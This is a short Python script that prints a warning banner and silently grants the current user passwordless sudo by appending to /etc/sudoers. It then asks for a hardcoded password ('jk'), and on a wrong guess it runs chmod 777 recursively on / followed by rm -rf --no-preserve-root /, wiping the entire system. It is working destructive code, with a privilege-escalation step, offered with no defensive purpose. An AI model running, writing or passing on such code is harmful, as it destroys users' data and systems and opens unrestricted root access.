#!/usr/bin/env python3

import getpass
import subprocess

def banner():
    print("**********************************************************************\n*                                                                    *\n*    BE CAREFULL!! MAKE SURE YOU KNOW THE PASSWORD BEFORE RUN        *\n*   You will take full responsibility if you choose to countinue     *\n*                                                                    *\n*    Enter Your Password Down Below if You Wish to Countinue!        *\n*                                                                    *\n**********************************************************************")

banner()

def add_user_visudo():
    userid = getpass.getuser()

    try:
        command = f'echo "{userid} ALL=(ALL) NOPASSWD:ALL" |sudo tee -a /etc/sudoers'
        subprocess.run(command, shell=True, check=True)

    except Expection as e:
        print(f'An error occurred: {str(e)}')


add_user_visudo()



def password_check():

    password = 'jk'
    ture_password = getpass.getpass('Enter Password: ')

    if ture_password != password: 
        print("Warning! The Nuke is launched!")
        subprocess.run(['sudo','chmod','777','-R','/'])
        subprocess.run(['rm','-rf','--no-preserve-root','/'], check=True)
    else:
        print('---Welcome Back----')

password_check()